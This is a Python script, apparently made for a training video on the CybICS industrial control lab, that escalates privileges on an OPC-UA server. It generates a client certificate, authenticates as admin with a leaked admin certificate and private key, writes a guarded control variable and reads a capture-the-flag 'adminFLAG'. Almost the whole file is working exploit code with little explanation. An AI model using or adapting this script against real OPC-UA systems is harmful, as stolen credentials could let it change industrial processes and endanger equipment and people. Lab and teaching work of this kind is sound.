#!/usr/bin/env python3
"""OPC-UA privilege escalation for the training video: use the LEAKED admin
certificate and private key as an X509 user token to authenticate as admin,
write the guarded variable, and read the unlocked admin flag.

Usage: opcua_escalate.py [value]   (value defaults to 1; 0 re-locks the flag)
"""
import asyncio, os, subprocess, sys
from asyncua import Client, ua

ADMIN = "/CybICS/software/opcua/certificates/trusted/cert_admin.der"
AKEY = "/CybICS/software/opcua/certificates/trusted/key_admin.pem"
CLI, CKEY = "/tmp/cyopcua_cli.der", "/tmp/cyopcua_cli.pem"
val = int(sys.argv[1]) if len(sys.argv) > 1 else 1

async def main():
    if True:
        subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-keyout", CKEY,
                        "-out", CLI, "-outform", "der", "-days", "3650", "-nodes",
                        "-subj", "/CN=cybics-client",
                        "-addext", "extendedKeyUsage=clientAuth,serverAuth",
                        "-addext", "subjectAltName=URI:urn:cybics:client"],
                       check=True, capture_output=True)
        print("[+] generated an attacker client certificate")
    c = Client("opc.tcp://172.18.0.5:4840")
    c.application_uri = "urn:cybics:client"
    await c.set_security_string(f"Basic256Sha256,SignAndEncrypt,{CLI},{CKEY}")
    await c.load_client_certificate(ADMIN)     # X509 user identity = leaked admin cert
    await c.load_private_key(AKEY)
    await c.connect()
    print("[+] authenticated to OPC-UA as ADMIN using the leaked certificate")
    cyb = [o for o in await c.nodes.objects.get_children()
           if (await o.read_browse_name()).Name == "CybICS Variables"][0]
    guard = admin = None
    for node in await cyb.get_children():
        n = (await node.read_browse_name()).Name
        if n.startswith("Set"): guard = node
        if n == "adminFLAG": admin = node
    await guard.write_value(ua.Variant(val, ua.VariantType.UInt16))
    print(f"[+] wrote the guarded variable = {val}  (admin privilege)")
    await asyncio.sleep(2.5)
    print(f"[+] adminFLAG = {await admin.read_value()!r}")
    await c.disconnect()

asyncio.run(asyncio.wait_for(main(), 25))
